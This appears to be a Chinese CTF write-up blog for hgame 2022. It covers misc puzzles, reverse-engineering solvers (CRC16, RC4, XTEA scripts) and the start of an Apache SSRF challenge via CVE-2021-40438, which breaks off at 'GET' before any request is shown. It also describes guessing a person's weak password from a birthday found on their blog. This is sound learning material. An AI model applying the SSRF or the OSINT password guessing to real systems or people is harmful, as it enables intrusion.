+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="奇妙小游戏"><a href="#奇妙小游戏" class="headerlink" title="奇妙小游戏"></a>奇妙小游戏</h2><p>同样很麻的一题，不过这题脑洞没前面密码那题大，一下午不到还是做出来了。nc连接后是一个迷宫图，还给了一个entry值，通过多次做错分析答案得出解法：<br><img src="https://s2.loli.net/2022/01/31/dulBXJy9p6cYHon.png"></p>
+<blockquote>
+<p>如图所示分列，entry即为起点列，从下往上行进，如果碰到横过来的部分就要通过那个部分前往另一列，然后继续上行，以此规则最后抵达哪一列的最上面答案就是那个数字。</p>
+</blockquote>
+<p>得出解法后一直过关就可以了，不过容器给的时间是真的短：<br><img src="https://s2.loli.net/2022/01/31/xuq8FnrAvWgltaV.png"></p>
+<h2 id="一张怪怪的名片"><a href="#一张怪怪的名片" class="headerlink" title="一张怪怪的名片"></a>一张怪怪的名片</h2><p>社工题，首先给了个二维码，拼接玩发现扫不出来，用qrazybox进行识别：<br><img src="https://s2.loli.net/2022/01/31/OoQzfmtFKA5YMSP.png"></p>
+<p>接着使用其中的关键字<code>homeboyc</code>，谷歌或者必应等搜索，找到博客：<br><img src="https://s2.loli.net/2022/01/31/cWtqoix126Ka8sE.png"></p>
+<p>接着翻阅博客，发现友链部分有一个自留地：<br><img src="https://s2.loli.net/2022/01/31/jFbGSVK5a7JCm4i.png"></p>
+<p>点击进去发现3篇博客，一篇是去年8月16日发布的鸿师傅庆祝女友19岁生日，一篇提示有一个弱密码并且含有一个信息，还有一篇博客直指flag：<br><img src="https://s2.loli.net/2022/01/31/3aOYe8IBUvx7wmg.png"></p>
+<p>根据博客内容，需要猜测弱密码并且进行PBKDF2将密码转化为key，猜了半天才猜出来密码是<code>hgame20020816</code>，接着解密就可以了：<br><img src="https://s2.loli.net/2022/01/31/PwVnRDrJAUlaxfL.png"><br><img src="https://s2.loli.net/2022/01/31/oClWa1xuZz7rqSv.png"></p>
+<h2 id="你上当了-我的很大"><a href="#你上当了-我的很大" class="headerlink" title="你上当了 我的很大"></a>你上当了 我的很大</h2><p>附件给了一个3点多G的压缩包，里面是压缩包套娃，应该套娃出来是四个二维码的，但是出题人失误放重复了，所以里面只有两个不同的二维码：<br><img src="https://s2.loli.net/2022/02/01/AOcqpS7isTFUbIw.png"><br><img src="https://s2.loli.net/2022/02/01/RwgerqOEnu5BizU.png"><br><img src="https://s2.loli.net/2022/02/01/exB64r8Ydb7PWSo.png"><br><img src="https://s2.loli.net/2022/02/01/hApDy5zP6mCvl8e.png"></p>
+<p>后面又放了剩下的两个二维码：<br><img src="https://s2.loli.net/2022/02/01/k8Rr42QL5ojsUPu.png"><br><img src="https://s2.loli.net/2022/02/01/rcbfekXxyBRC8QK.png"></p>
+<p>这四个二维码依次为Data Matrix、codablock F、Aztec、PDF147码，依次扫码得到四个base64码，四个base64码转换成四张图片，四张图片组合成一个QR码，扫描即可得到flag：<br><img src="https://s2.loli.net/2022/02/01/UCS5Omx8qzR6JHn.png"><br><img src="https://s2.loli.net/2022/02/01/ORdaT14MxY62JrQ.png"><br><img src="https://s2.loli.net/2022/02/01/Rc67QNBfeLwxyGP.png"><br><img src="https://s2.loli.net/2022/02/01/U169IQOdTVjeE7m.png"><br><img src="https://s2.loli.net/2022/02/01/8AZ6UGdDeHqOBlT.png"></p>
+<p>截图的时候要尽量截刚好，否则二维码可能会识别失败。</p>
+<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="xD-MAZE"><a href="#xD-MAZE" class="headerlink" title="xD MAZE"></a>xD MAZE</h2><p>直接放伪代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __fastcall sub_4015EC(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; // rdx</span><br><span class="line">  int v3; // ebx</span><br><span class="line">  __int64 v4; // rdx</span><br><span class="line">  unsigned int v5; // eax</span><br><span class="line">  __int64 v6; // rsi</span><br><span class="line">  __int64 v7; // rdx</span><br><span class="line">  __int64 v8; // rax</span><br><span class="line">  signed __int64 result; // rax</span><br><span class="line">  bool v10; // al</span><br><span class="line">  __int64 v11; // rax</span><br><span class="line">  __int64 v12; // rax</span><br><span class="line">  __int64 v13; // rax</span><br><span class="line">  __int64 v14; // rax</span><br><span class="line">  __int64 v15; // [rsp+20h] [rbp-30h]</span><br><span class="line">  __int64 v16; // [rsp+28h] [rbp-28h]</span><br><span class="line">  __int64 v17; // [rsp+30h] [rbp-20h]</span><br><span class="line">  __int64 v18; // [rsp+38h] [rbp-18h]</span><br><span class="line">  int v19; // [rsp+40h] [rbp-10h]</span><br><span class="line">  int i; // [rsp+48h] [rbp-8h]</span><br><span class="line">  int v21; // [rsp+4Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  sub_401980(a1, (__int64 *)a2);</span><br><span class="line">  v15 = 0LL;</span><br><span class="line">  v16 = 0LL;</span><br><span class="line">  v17 = 0LL;</span><br><span class="line">  v18 = 0LL;</span><br><span class="line">  v19 = 0;</span><br><span class="line">  v21 = 0;</span><br><span class="line">  ZStrsIcSt11char_traitsIcEERSt13basic_istreamIT_T0_ES6_PS3_(a1, a2, (__int64)&amp;v15, (__int64)&amp;ZSt3cin);</span><br><span class="line">  v3 = sub_401550(a1, a2, v2, &amp;v15);</span><br><span class="line">  v5 = sub_401550(a1, a2, v4, &quot;hgame&#123;&quot;);</span><br><span class="line">  v6 = v5;</span><br><span class="line">  if ( v3 != v5 + (unsigned int)sub_401550(a1, v5, v7, &quot;&#125;&quot;) + 28 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(a1, v6, &quot;length err&quot;, &amp;ZSt4cout);</span><br><span class="line">    ZNSolsEPFRSoS_E(a1, v6, ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_, v8);</span><br><span class="line">    result = 1LL;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = (unsigned int)sub_40158F(a1, v6, (__int64)&quot;hgame&#123;&quot;, (__int64)&amp;v15, 6) || BYTE2(v19) != 125;</span><br><span class="line">    if ( v10 )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(a1, v6, &quot;Forbidden format&quot;, &amp;ZSt4cout);</span><br><span class="line">      ZNSolsEPFRSoS_E(a1, v6, ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_, v11);</span><br><span class="line">      result = 1LL;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      for ( i = 6; i &lt;= 33; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        switch ( *((_BYTE *)&amp;v15 + i) )</span><br><span class="line">        &#123;</span><br><span class="line">          case 0x30:</span><br><span class="line">            v21 += 512;</span><br><span class="line">            break;</span><br><span class="line">          case 0x31:</span><br><span class="line">            v21 += 64;</span><br><span class="line">            break;</span><br><span class="line">          case 0x32:</span><br><span class="line">            v21 += 8;</span><br><span class="line">            break;</span><br><span class="line">          case 0x33:</span><br><span class="line">            ++v21;</span><br><span class="line">            break;</span><br><span class="line">          default:</span><br><span class="line">            v12 = ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(a1, v6, &quot;Forbidden format&quot;, &amp;ZSt4cout);</span><br><span class="line">            ZNSolsEPFRSoS_E(a1, v6, ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_, v12);</span><br><span class="line">            return 1LL;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( unk_404020[v21] != 32 || v21 &gt; 4095 )</span><br><span class="line">        &#123;</span><br><span class="line">          v13 = ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(a1, v6, &quot;Failed&quot;, &amp;ZSt4cout);</span><br><span class="line">          ZNSolsEPFRSoS_E(a1, v6, ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_, v13);</span><br><span class="line">          return 1LL;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      v14 = ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(a1, v6, &quot;Win&quot;, &amp;ZSt4cout);</span><br><span class="line">      ZNSolsEPFRSoS_E(a1, v6, ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_, v14);</span><br><span class="line">      result = 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>逻辑还是很好理解的，读懂代码后我们发现flag就是由0,1,2,3这四个数字组成的，然后翻汇编我们可以发现后面有一排#号和空格交叉的伪字符串。v15是我们的flag，v21就是后面一排伪字符串的位置。根据空格之间差了几个#，对应着0,1,2,3，具体可以根据上面的伪代码判断。</p>
+<p>然后因为我懒，就没写脚本了，直接手算了，得出flag：<br><img src="https://s2.loli.net/2022/02/01/bIQi4oalyzVwSXO.png"></p>
+<h2 id="upx-magic-0"><a href="#upx-magic-0" class="headerlink" title="upx magic 0"></a>upx magic 0</h2><p>笑死，这题附件给错了，给了个脱壳后的文件，本来是不会脱壳的。同样先看伪代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">sub_40FAC0((unsigned __int64)&quot;%40s&quot;);</span><br><span class="line">  if ( sub_4004E0((__int64)&amp;v41, (__int64)&amp;v41) != (signed __int64 (__usercall *)@&lt;rax&gt;(__int64@&lt;rax&gt;, unsigned __int64@&lt;rdi&gt;, __int128@&lt;xmm0&gt;, __m256i@&lt;ymm0&gt;))32 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_40F940((unsigned __int64)&quot;length error&quot;);</span><br><span class="line">    sub_40ED20(0LL);</span><br><span class="line">  &#125;</span><br><span class="line">  for ( i = 0; i &lt; (unsigned __int64)sub_4004E0((__int64)&amp;v41, (__int64)&amp;v41); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = *((char *)&amp;v41 + i) &lt;&lt; 8;</span><br><span class="line">    for ( j = 0; j &lt;= 7; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v6 &amp; 0x8000 )</span><br><span class="line">        v6 = 2 * v6 ^ 0x1021;</span><br><span class="line">      else</span><br><span class="line">        v6 *= 2;</span><br><span class="line">    &#125;</span><br><span class="line">    v40[i] = (unsigned __int16)v6;</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = 36200;</span><br><span class="line">  v9 = 40265;</span><br><span class="line">  v10 = 10770;</span><br><span class="line">  v11 = 43802;</span><br><span class="line">  v12 = 52188;</span><br><span class="line">  v13 = 47403;</span><br><span class="line">  v14 = 11826;</span><br><span class="line">  v15 = 40793;</span><br><span class="line">  v16 = 56781;</span><br><span class="line">  v17 = 40265;</span><br><span class="line">  v18 = 43274;</span><br><span class="line">  v19 = 3696;</span><br><span class="line">  v20 = 62927;</span><br><span class="line">  v21 = 2640;</span><br><span class="line">  v22 = 23285;</span><br><span class="line">  v23 = 65439;</span><br><span class="line">  v24 = 40793;</span><br><span class="line">  v25 = 48395;</span><br><span class="line">  v26 = 22757;</span><br><span class="line">  v27 = 14371;</span><br><span class="line">  v28 = 48923;</span><br><span class="line">  v29 = 30887;</span><br><span class="line">  v30 = 43802;</span><br><span class="line">  v31 = 18628;</span><br><span class="line">  v32 = 43274;</span><br><span class="line">  v33 = 11298;</span><br><span class="line">  v34 = 40793;</span><br><span class="line">  v35 = 23749;</span><br><span class="line">  v36 = 24277;</span><br><span class="line">  v37 = 30887;</span><br><span class="line">  v38 = 9842;</span><br><span class="line">  v39 = 22165;</span><br><span class="line">  if ( (unsigned int)sub_400490(v40, &amp;v8, 32LL) )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = &quot;Wrong&quot;;</span><br><span class="line">    sub_4107A0(&quot;Wrong&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = &quot;Great,your input is flag&quot;;</span><br><span class="line">    sub_4107A0(&quot;Great,your input is flag&quot;);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>逻辑也不是很难，一个crc16加密逻辑，直接写脚本解出来就可以了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">list = [0x8d68,0x9d49,0x2a12,0xab1a,0xcbdc,0xb92b,0x2e32,0x9f59,0xddcd,0x9d49,0xa90a,0xe70,0xf5cf,0xa50,0x5af5,0xff9f,0x9f59,0xbd0b,0x58e5,0x3823,0xBF1B,0x78a7,0xab1a,0x48c4,0xa90a,0x2c22,0x9f59,0x5cc5,0x5ed5,0x78a7,0x2672,0x5695]</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for b in list:</span><br><span class="line">    for i in range(0,8):</span><br><span class="line">        if(b &amp; 1):</span><br><span class="line">            b = (b ^ 0x1021) // 2</span><br><span class="line">            b ^= 0x8000</span><br><span class="line">        else:</span><br><span class="line">            b //= 2</span><br><span class="line">    b = b &gt;&gt; 8</span><br><span class="line">    flag += chr(b)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<p>得到flag：<br><img src="https://s2.loli.net/2022/02/01/Cmwev7RnGSJhzg4.png"></p>
+<h2 id="fake-shell"><a href="#fake-shell" class="headerlink" title="fake shell"></a>fake shell</h2><p>这题最后才弄完的，逻辑还是比较清楚的，但是这题最坑的点在于执行主函数之前的初始化偷偷跑了个函数，把原来的“happyhg4me!”替换成了“w0wy0ugot1t”，导致一直跑不出来。后来放提示才注意到。</p>
+<p>正向逻辑调用了两个函数，关键伪代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">unsigned int64  sub_1358(int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  char v4; // [rsp+27h] [rbp-119h]</span><br><span class="line">  int i; // [rsp+28h] [rbp-118h]</span><br><span class="line">  int j; // [rsp+28h] [rbp-118h]</span><br><span class="line">  int v7; // [rsp+2Ch] [rbp-114h]</span><br><span class="line">  int64 v8[33]; // [rsp+30h] [rbp-110h] BYREF</span><br><span class="line">  char a2=&quot;happyhg4me!&quot;;</span><br><span class="line">  int a3=11;</span><br><span class="line">  v7 = 0;</span><br><span class="line">  memset(a1, 0, 256);</span><br><span class="line">  memset(v8, 0, 256);</span><br><span class="line">  for ( i = 0; i &lt;= 255; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(i + a1) = i;</span><br><span class="line">    *((_BYTE *)v8 + i) = *(_BYTE *)(i % a3 + a2);</span><br><span class="line">  &#125;</span><br><span class="line">  for ( j = 0; j &lt;= 255; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = (*((char *)v8 + j) + v7 + *(unsigned int8 *)(j + a1)) % 256;</span><br><span class="line">    v4 = *(_BYTE *)(j + a1);</span><br><span class="line">    *(_BYTE *)(j + a1) = *(_BYTE *)(v7 + a1);</span><br><span class="line">    *(_BYTE *)(a1 + v7) = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">unsigned int64  sub_1635(int64 a1, int64 a2, unsigned int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int64 result; // rax</span><br><span class="line">  char v4; // [rsp+23h] [rbp-15h]</span><br><span class="line">  int v5; // [rsp+24h] [rbp-14h]</span><br><span class="line">  int v6; // [rsp+28h] [rbp-10h]</span><br><span class="line">  unsigned int64 i; // [rsp+30h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = 0;</span><br><span class="line">  v6 = 0;</span><br><span class="line">  for ( i = 0LL; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    if ( i &gt;= a3 )</span><br><span class="line">      break;</span><br><span class="line">    v5 = (v5 + 1) % 256;</span><br><span class="line">    v6 = (v6 + *(unsigned int8 *)(v5 + a1)) % 256;</span><br><span class="line">    v4 = *(_BYTE *)(v5 + a1);</span><br><span class="line">    *(_BYTE *)(v5 + a1) = *(_BYTE *)(v6 + a1);</span><br><span class="line">    *(_BYTE *)(a1 + v6) = v4;</span><br><span class="line">    *(_BYTE *)(a2 + i) ^= *(_BYTE *)((unsigned int8)(*(_BYTE *)(v5 + a1) + *(_BYTE *)(v6 + a1)) + a1);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后给出了加密完的数据，记住逆序，写脚本跑flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">a1 = []</span><br><span class="line">a2=&quot;w0wy0ugot1t&quot;</span><br><span class="line">v7=0</span><br><span class="line">v8=[]</span><br><span class="line">for i in range(0, 256):</span><br><span class="line">    a1.append(i)</span><br><span class="line">    v8.append(ord(a2[i%11]))</span><br><span class="line"></span><br><span class="line">for j in range(0, 256):</span><br><span class="line">  v4 =a1[j]</span><br><span class="line">  v7=(v8[j]+v7+v4)%256</span><br><span class="line">  a1[j]=a1[v7]</span><br><span class="line">  a1[v7]=v4</span><br><span class="line"></span><br><span class="line">v5 = 0</span><br><span class="line">v6 = 0</span><br><span class="line">flag=[0xB6,0x94,0xFA,0x8F,0x3D,0x5F,0xB2,0xE0,0xEA,0x0F,0xD2,0x66,0x98,0x6C,0x9d,0xe7,0x1b,0x08,0x40,0x71,0xc5,0xbe,0x6f,0x6d,0x7c,0x7b,0x09,0x8d,0xa8,0xbd,0xf3,0xf6]</span><br><span class="line">s=&#x27;&#x27;</span><br><span class="line">for j in range(0, 32):</span><br><span class="line">    v5 = (v5 + 1) % 256</span><br><span class="line">    v4=a1[v5]</span><br><span class="line">    v6 = (v6 + v4) % 256</span><br><span class="line">    a1[v5]=a1[v6]</span><br><span class="line">    a1[v6]=v4</span><br><span class="line">    t=(a1[v5]+a1[v6])% 256</span><br><span class="line">    t1=flag[j]</span><br><span class="line">    t1^=a1[t]</span><br><span class="line">    s+=chr(t1)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>
+
+<p>得到flag：<br><img src="https://s2.loli.net/2022/02/03/2XAPzlBN45IJif7.png"></p>
+<h2 id="creakme2"><a href="#creakme2" class="headerlink" title="creakme2"></a>creakme2</h2><p>和creakme相似，都是xtea逻辑，但是这里做了个Windows SEH 异常处理机制，即除零报错。解决方法是判断数据循环中计算后是否为正数，为正数则与0x1234567进行一次异或。</p>
+<p>直接改xtea脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123;</span><br><span class="line">    unsigned int i;</span><br><span class="line">    uint32_t v0=v[0], v1=v[1], delta=0x9E3779B1, sum=0xc78e4d05; //这里加密逻辑变了初始sam值可以跑正向逻辑得到</span><br><span class="line">    for (i=0; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]);</span><br><span class="line">        if((sum &gt;&gt; 31) == 0)&#123;</span><br><span class="line">            sum ^= 0x1234567;</span><br><span class="line">        &#125;</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[ 0]=v0; v[1]=v1;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    uint32_t v[8]=&#123;0x457E62CF,0x9537896C,0x1F7E7F72,0x0F7A073D8,0x8E996868,0x40AFAF99,0x0F990E34,0x196F4086&#125;;</span><br><span class="line">    uint32_t const k[4]=&#123;1,2,3,4&#125;;</span><br><span class="line">    unsigned int r=32;</span><br><span class="line">    for (i = 0; i &lt; 4;i++)&#123;</span><br><span class="line">        decipher(r, (v+i*2), k);</span><br><span class="line">        printf(&quot;解密后的数据:%x %x\n&quot;,v[i*2],v[i*2+1]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/02/02/PswZYCVXbenDpOm.png"></p>
+<p>十六进制逆向一下跑出来就是flag了：<br><img src="https://s2.loli.net/2022/02/03/wXgTo8cWvYtrZ4p.png"></p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache!"></a>Apache!</h2><p>打开网页发现提示<code>www.zip</code>，下载附件后发现四个配置文件，分别为<code>httpd.conf</code>、<code>httpd-vhosts.conf</code>、<code>docker-compose.yml</code>和<code>default.conf</code>。通过审计配置文件和题目要求我们打入本地内网，判断考点是利用apache漏洞进行ssrf。</p>
+<p>搜索相关漏洞。发现CVE-2021-40438漏洞，我们利用这个漏洞进行ssrf打本地。关于这个漏洞可以参考下面的几篇文章：<br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/257657#h3-5">Apache httpd Server CVE-2021-40438 漏洞分析</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/asasd101/article/details/120838177">Apache mod_proxy SSRF（CVE-2021-40438）的一点分析和延伸</a></p>
+<p>构造请求头：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET 